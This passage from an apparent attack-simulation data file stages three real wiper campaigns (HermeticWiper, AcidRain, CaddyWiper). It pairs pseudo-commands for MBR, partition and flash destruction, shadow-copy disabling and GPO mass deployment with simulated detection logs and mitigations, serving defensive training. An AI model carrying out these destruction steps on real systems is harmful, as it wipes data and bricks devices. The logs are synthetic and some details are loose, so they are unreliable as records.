              ExtortionModel: 'Pure Data-Leak Extortion (No File Encryption)',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'hermeticwiper-ukraine-easeus-mbr-wipe',
    title: 'Sandworm HermeticWiper Signed EaseUS Driver (empntdrv.sys) MBR & NTFS $MFT Destruction',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1561.002',
    description:
      'Sandworm (GRU Unit 74455) deploys HermeticWiper (FoxBlade), signed with a certificate issued to Hermetica Digital Ltd. The wiper extracts a legitimate, Microsoft-signed EaseUS Partition Master kernel driver (empntdrv.sys) from its RCDATA resource section to gain raw physical disk access and overwrite the MBR, NTFS boot sectors, $MFT, and $LogFile.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Sandworm GPO / WMI Deployment', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'HermeticWiper (conhost.dll / Hermetica)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Signed EaseUS Driver (empntdrv.sys)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'ESET / SentinelOne / CISA MAR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'PhysicalDrive0 MBR & NTFS $MFT Wiped', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Extracting & Registering Signed EaseUS Driver (empntdrv.sys) from RCDATA',
        narration:
          'HermeticWiper enables SeLoadDriverPrivilege and SeBackupPrivilege, checks the OS bitness and Windows version, decompresses an MSZIP-compressed legitimate EaseUS Partition Master driver (DRV_X64 / empntdrv.sys) from its PE RCDATA resource section, and loads it as a kernel service.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Privilege Escalation & Defense Evasion (T1068 / T1543.003)',
        technicalCommands: [
          'AdjustTokenPrivileges(SeLoadDriverPrivilege, SeBackupPrivilege, SeShutdownPrivilege)',
          'Extract RCDATA "DRV_X64" -> C:\\Windows\\System32\\drivers\\<random_2_chars>dr.sys (Signed EaseUS empntdrv.sys)',
        ],
        defenseMitigation:
          'Block partition-management kernel drivers (`empntdrv.sys`, `epmntdrv.sys`, `RawDisk`) on enterprise workstations and servers using WDAC.',
        logs: [
          {
            id: 'herm-1',
            timestamp: '16:02:11.104',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 6,
            raw: 'EventID: 6 (DriverLoaded) | ImageLoaded: C:\\Windows\\System32\\drivers\\abdr.sys | OriginalFileName: empntdrv.sys (EaseUS Partition Master) | Signer: CHENGDU YIWO Tech Development Co., Ltd. | ParentBinary: HermeticWiper (Signed: Hermetica Digital Ltd)',
            parsedFields: {
              WiperBinary: 'HermeticWiper / FoxBlade (Hermetica Digital Ltd)',
              EmbeddedDriverResource: 'RCDATA DRV_X64 (EaseUS empntdrv.sys)',
              LoadedServicePath: 'C:\\Windows\\System32\\drivers\\abdr.sys',
              AdvisoryId: 'CISA AA22-057A / MAR-10375867-1',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Disabling Volume Shadow Copy (vss), Crash Dumps & Fragmenting NTFS Metadata',
        narration:
          'Before overwriting the boot sectors, HermeticWiper disables the Volume Shadow Copy service (vss), turns off Windows crash dumps inHKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl to hide forensic memory artifacts, and parses the NTFS Master File Table ($MFT) to locate $Bitmap and $LogFile.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Inhibit System Recovery & Defense Evasion (T1490 / T1070)',
        technicalCommands: [
          'ChangeServiceConfigW(hVssService, SERVICE_DISABLED) && ControlService(hVssService, SERVICE_CONTROL_STOP)',
          'RegSetValueExW("HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl", "CrashDumpEnabled", 0)',
        ],
        defenseMitigation:
          'Monitor unexpected modifications to the `vss` service startup type (`SERVICE_DISABLED`) and `CrashControl\\CrashDumpEnabled` registry keys.',
        logs: [
          {
            id: 'herm-2',
            timestamp: '16:02:12.400',
            source: 'EDR',
            severity: 'critical',
            EventCode: 7040,
            raw: 'System Service Tampering Alert | Service: Volume Shadow Copy (vss) changed to DISABLED | RegistryModified: HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl\\CrashDumpEnabled = 0 | NTFS Enumeration: Parsing $MFT, $Bitmap, $LogFile',
            parsedFields: {
              DisabledService: 'vss (Volume Shadow Copy)',
              AntiForensicsRegistry: 'CrashControl\\CrashDumpEnabled = 0',
              TargetedNtfsStructures: '$MFT, $MFTMirr, $LogFile, $Bitmap',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Raw \\\\.\\PhysicalDrive0..100 MBR & NTFS $MFT Overwrite with CSPRNG Bytes',
        narration:
          'Using direct device handles (\\\\.\\PhysicalDrive0 through \\\\.\\PhysicalDrive100) and the EaseUS driver, HermeticWiper overwrites the Master Boot Record (first 512 bytes), partition tables, NTFS $MFT records, and Windows Registry hives with random bytes generated via CryptGenRandom, then forces an immediate system reboot (`ExitWindowsEx`).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1561.002 - Disk Structure Wipe)',
        technicalCommands: [
          'CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, ...) -> CryptGenRandom overwrite of Sector 0 (MBR)',
          'Overwrite NTFS $MFT, $LogFile, C:\\Windows\\System32\\config\\* -> ExitWindowsEx(EWX_REBOOT | EWX_FORCE)',
        ],
        defenseMitigation:
          'Enforce kernel-level raw disk write protection blocking non-system processes from opening `GENERIC_WRITE` handles to `\\\\.\\PhysicalDrive*`.',
        logs: [
          {
            id: 'herm-3',
            timestamp: '16:02:18.990',
            source: 'EDR',
            severity: 'critical',
            raw: 'Destructive Disk Structure Wipe Alert | TargetDevice: \\\\.\\PhysicalDrive0 (Sectors 0..2048 & NTFS $MFT) | BufferSource: CryptGenRandom | FinalCall: InitiateSystemShutdownExW / ExitWindowsEx(EWX_REBOOT) -> System Unbootable',
            parsedFields: {
              WipedDevice: '\\\\.\\PhysicalDrive0 .. \\\\.\\PhysicalDrive100',
              OverwrittenStructures: 'MBR (Sector 0), GPT/Partition Table, NTFS $MFT & $LogFile',
              FinalAction: 'Forced Reboot into Unbootable State',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'acidrain-viasat-ka-sat-modem-wiper',
    title: 'AcidRain MIPS ELF Satellite Modem Wiper (/dev/mtd MEMERASE / Viasat KA-SAT)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1561.001',
    description:
      'Attributed to Russian GRU actors during the February 2022 Viasat KA-SAT intrusion, the AcidRain 32-bit MIPS ELF wiper is pushed via the TR-069 management plane to tens of thousands of SurfBeam2 satellite modems, recursively wiping filesystems and issuing MEMERASE, MEMWRITEOOB, and MEMUNLOCK IOCTLs against /dev/mtd* SPI flash memory.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Compromised SATCOM TR-069 ACS Server', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'KA-SAT SurfBeam2 Modem (ukrop ELF)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Linux MTD Subsystem (/dev/mtd0..99)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'SentinelOne / Viasat SATCOM Telemetry', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Bricked SPI NOR/NAND Flash & Turbines', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Management Plane Compromise & TR-069 CWMP Push of MIPS ELF Binary (ukrop)',
        narration:
          'After breaching a misconfigured VPN into the trusted Viasat KA-SAT ground management segment, the attackers abuse the TR-069 Auto-Configuration Server (ACS) to push a 32-bit big-endian MIPS ELF binary (`ukrop` / AcidRain) to tens of thousands of SurfBeam2 satellite modems simultaneously.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access & Execution (T1199 - Trusted Relationship / TR-069 Management Plane)',
        technicalCommands: [
          'TR-069 CWMP Download RPC -> Pushes 32-bit MIPS ELF (/tmp/ukrop) to SurfBeam2 UT (User Terminals)',
          'Forks daemon process & iterates non-standard filesystem directories for recursive overwrite',
        ],
        defenseMitigation:
          'Cryptographically sign all firmware and management commands pushed via TR-069/CWMP and strictly segment satellite ground-station management networks with hardware MFA and command rate-limiting.',
        logs: [
          {
            id: 'acid-1',
            timestamp: '03:02:05.114',
            source: 'Firewall',
            severity: 'critical',
            raw: 'SATCOM Management Plane Alert | Protocol: TR-069 (CWMP) | Source: ACS Ground Segment | TargetFleet: SurfBeam2 Modems | PushedBinary: /tmp/ukrop (ELF 32-bit MSB executable, MIPS, MIPS32 version 1 - AcidRain Wiper)',
            parsedFields: {
              DeliveryMechanism: 'TR-069 CWMP Management Plane Push',
              BinaryPath: '/tmp/ukrop (AcidRain Wiper)',
              Architecture: '32-bit MIPS Big-Endian ELF',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Block Device Enumeration (/dev/sda, /dev/mmcblk) & Sequential Overwrite',
        narration:
          'Running as root (UID 0), AcidRain first recursively overwrites non-system files on the root filesystem, then loops through every standard storage block device identifier (/dev/sda..z, /dev/hda..z, /dev/VG/LV, /dev/mmcblk0..9) and overwrites up to 384KB with random or zero bytes.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Impact (T1561.002 - Disk Structure Wipe)',
        technicalCommands: [
          'Iterate block devices: /dev/sda..z, /dev/hda..z, /dev/mtdblock0..99, /dev/mmcblk0..9',
          'open(dev, O_WRONLY) -> Overwrite initial sectors & issue BLKSECDISCARD / BLKDISCARD IOCTLs',
        ],
        defenseMitigation:
          'Enforce read-only SquashFS root filesystems and mandatory code-signing (`IMA/EVM`) on embedded Linux routers and SATCOM terminals.',
        logs: [
          {
            id: 'acid-2',
            timestamp: '03:02:09.450',
            source: 'EDR',
            severity: 'critical',
            raw: 'Embedded Linux Storage Wipe Alert | Process: /tmp/ukrop (UID 0) | EnumeratedDevices: /dev/sda..z, /dev/mmcblk0..9, /dev/mtdblock0..99 | IssuedIOCTLs: BLKDISCARD (0x1277), BLKSECDISCARD (0x127d)',
            parsedFields: {
              TargetedBlockDevices: '/dev/sd*, /dev/hd*, /dev/mmcblk*, /dev/mtdblock*',
              BlockEraseIoctls: 'BLKDISCARD, BLKSECDISCARD, BLKZEROOUT',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Raw SPI Flash /dev/mtd0..99 Destruction via MEMUNLOCK, MEMERASE & MEMWRITEOOB',
        narration:
          'To permanently brick embedded satellite modems (which store their bootloader and firmware in raw NOR/NAND flash rather than SATA drives), AcidRain opens `/dev/mtd0` through `/dev/mtd99` and issues Linux Memory Technology Device (MTD) IOCTLs `MEMUNLOCK`, `MEMERASE`, and `MEMWRITEOOB` before calling `reboot(RB_AUTOBOOT)`.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1495 - Firmware Corruption / T1561.001)',
        technicalCommands: [
          'open("/dev/mtd0" .. "/dev/mtd99", O_RDWR)',
          'ioctl(fd, MEMUNLOCK, &ei) -> ioctl(fd, MEMERASE, &ei) -> ioctl(fd, MEMWRITEOOB, &oob) -> reboot(RB_AUTOBOOT)',
        ],
        defenseMitigation:
          'Hardware-lock bootloader flash sectors (`WP#` pin on SPI NOR flash) so software `MEMUNLOCK` / `MEMERASE` IOCTLs cannot erase the primary U-Boot bootloader partition (`/dev/mtd0`).',
        logs: [
          {
            id: 'acid-3',
            timestamp: '03:02:14.882',
            source: 'EDR',
            severity: 'critical',
            raw: 'Hardware Flash Corruption Alert (SentinelLabs AcidRain) | Device: /dev/mtd0 (U-Boot Bootloader Partition) | Syscalls: ioctl(MEMUNLOCK) -> ioctl(MEMERASE) -> ioctl(MEMWRITEOOB) -> reboot() | Impact: Modem permanently bricked (Factory replacement required)',
            parsedFields: {
              MtdDevicesTargeted: '/dev/mtd0 through /dev/mtd99',
              DestructiveMtdIoctls: 'MEMUNLOCK, MEMERASE, MEMWRITEOOB',
              PhysicalImpact: '40,000+ SATCOM Modems & 5,800 Enercon Wind Turbines Offline',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'caddywiper-arguepatch-gpo-destruction',
    title: 'Sandworm ArguePatch Loader & CaddyWiper Domain-Aware Disk Wiper (T1561.001)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1561.001',
    description:
      'Sandworm pushes CaddyWiper across enterprise networks via Active Directory Group Policy Objects (GPO) and the ArguePatch loader (a patched legitimate IDA Pro remote debugger server binary). CaddyWiper calls DsRoleGetPrimaryDomainInformation to intentionally skip Domain Controllers (preserving Sandworm’s foothold) while zeroing out C:\\Users, D:\\..Z:\\, and \\\\.\\PhysicalDrive* on all member hosts.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Sandworm GPO Scheduled Task Push', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'ArguePatch Loader (Patched win32_remote.exe)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'CaddyWiper (DsRole Domain Controller Check)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'ESET / Cisco Talos / CERT-UA Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'IOCTL_DISK_SET_DRIVE_LAYOUT_EX Zeroing', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: GPO Mass Deployment & ArguePatch Patched Debugger Loader Execution',
        narration:
          'From a compromised Domain Controller, Sandworm creates a Group Policy Scheduled Task that copies and executes ArguePatch (a patched copy of Hex-Rays IDA Pro’s legitimate win32_remote.exe debugger server) or caddy.exe across all domain-joined machines, decrypting the CaddyWiper shellcode in memory.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Execution & Defense Evasion (T1053.005 - Scheduled Task / T1574)',
        technicalCommands: [
          'GPO Scheduled Task: Copy \\\\DC01\\SYSVOL\\corp.local\\scripts\\caddy.exe -> C:\\Users\\Public\\',
          'ArguePatch Loader: Patched IDA win32_remote.exe decrypts and jumps to CaddyWiper shellcode in RAM',
        ],
        defenseMitigation:
          'Audit Active Directory Group Policy Object modifications (EventID 5136) for newly added Immediate Scheduled Tasks referencing `SYSVOL` or `NETLOGON` binaries.',
        logs: [
          {
            id: 'caddy-1',
            timestamp: '10:00:02.115',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'win32_remote.exe',
            raw: 'EventID: 1 | ParentImage: C:\\Windows\\System32\\svchost.exe (Schedule) | Image: C:\\Users\\Public\\win32_remote.exe (ArguePatch Loader) | Payload: CaddyWiper In-Memory Shellcode | Deployment: Active Directory GPO',
            parsedFields: {
              DeliveryVector: 'Active Directory GPO Scheduled Task',
              LoaderName: 'ArguePatch (Patched Hex-Rays IDA win32_remote.exe)',
              WiperPayload: 'CaddyWiper (T1561.001)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: DsRoleGetPrimaryDomainInformation Check to Spare Domain Controllers',
        narration:
          'Upon starting, CaddyWiper resolves APIs dynamically on the stack and calls DsRoleGetPrimaryDomainInformation(NULL, DsRolePrimaryDomainInfoBasic, &info). If MachineRole equals DsRole_RolePrimaryDomainController (5), CaddyWiper immediately exits—ensuring the Domain Controller stays alive to keep pushing the wiper GPO to newly booted machines.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Discovery & Execution Guardrails (T1082 / T1480 - Execution Guardrails)',
        technicalCommands: [
          'DsRoleGetPrimaryDomainInformation(NULL, DsRolePrimaryDomainInfoBasic, &pInfo)',
          'if (pInfo->MachineRole == DsRole_RolePrimaryDomainController) { ExitProcess(0); }',
        ],
        defenseMitigation:
          'Immediately unlink malicious GPOs and isolate the Primary Domain Controller (`PDC`) during a wiper outbreak, as the PDC is intentionally left intact by the malware to act as the distribution engine.',
        logs: [
          {
            id: 'caddy-2',
            timestamp: '10:00:02.450',
            source: 'EDR',
            severity: 'critical',
            raw: 'CaddyWiper Execution Guardrail Alert | API: netapi32!DsRoleGetPrimaryDomainInformation | CheckedValue: DsRole_RolePrimaryDomainController (0x5) | HostRole: Member Workstation (Proceeding with Wipe)',
            parsedFields: {
              GuardrailApi: 'netapi32.dll!DsRoleGetPrimaryDomainInformation',
              SparedRole: 'DsRole_RolePrimaryDomainController (5)',
              OperationalReason: 'Preserve AD GPO distribution & attacker foothold on DC',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: TakeOwnership Recursive File Zeroing & IOCTL_DISK_SET_DRIVE_LAYOUT_EX Wipe',
        narration:
          'On all non-DC machines, CaddyWiper enables SeTakeOwnershipPrivilege, recursively takes ownership (`SetNamedSecurityInfoA` + `SetEntriesInAclA`) and zeroes out every file in `C:\\Users` and drives `D:\\` through `Z:\\`, and finally calls `DeviceIoControl` with `IOCTL_DISK_SET_DRIVE_LAYOUT_EX` (`0x0007C054`) on `\\\\.\\PhysicalDrive9` down to `\\\\.\\PhysicalDrive0` to zero out the GPT/MBR partition layout.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1561.001 - Disk Content Wipe / T1561.002 - Disk Structure Wipe)',
        technicalCommands: [
          'Recursive ACL Takeover + Zero-Fill: C:\\Users\\* and D:\\ .. Z:\\',
          'DeviceIoControl("\\\\.\\PhysicalDrive0", IOCTL_DISK_SET_DRIVE_LAYOUT_EX [0x7C054], &zeroBuffer, 0x780, ...)',
        ],
        defenseMitigation:
          'Block `IOCTL_DISK_SET_DRIVE_LAYOUT_EX` (`0x0007C054`) calls from non-disk-management processes and monitor high-velocity `SetNamedSecurityInfoA` ACL modifications across `C:\\Users`.',
        logs: [
          {
            id: 'caddy-3',
            timestamp: '10:00:08.912',
            source: 'EDR',
            severity: 'critical',
            raw: 'Partition Layout Destruction Alert (CaddyWiper) | Process: win32_remote.exe | Target: \\\\.\\PhysicalDrive9 .. \\\\.\\PhysicalDrive0 | IOCTL: 0x0007C054 (IOCTL_DISK_SET_DRIVE_LAYOUT_EX with 1,920 zero bytes) | Result: All disk partitions erased',
            parsedFields: {
              FileWipeScope: 'C:\\Users and Drives D:\\ through Z:\\ (Zero-filled)',
              PartitionWipeIoctl: '0x0007C054 (IOCTL_DISK_SET_DRIVE_LAYOUT_EX)',
              PhysicalDrivesTargeted: '\\\\.\\PhysicalDrive9 down to \\\\.\\PhysicalDrive0',
            },
          },
        ],
        packets: [],
      },
    ],
  },
];
